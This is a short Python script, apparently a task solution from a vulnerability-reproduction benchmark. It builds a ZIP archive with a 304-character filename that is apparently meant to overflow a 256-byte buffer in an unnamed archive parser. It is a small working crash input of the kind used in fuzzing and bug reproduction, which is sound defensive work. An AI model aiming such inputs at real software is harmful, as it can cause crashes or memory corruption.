import io
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a ZIP archive with a filename longer than 256 bytes
        long_filename = "A" * 300 + ".txt"  # 304 characters total

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_STORED) as zf:
            zf.writestr(long_filename, b"x")  # minimal file content

        return buffer.getvalue()


if __name__ == "__main__":
    import sys

    src = sys.argv[1] if len(sys.argv) > 1 else "."
    data = Solution().solve(src)
    sys.stdout.buffer.write(data)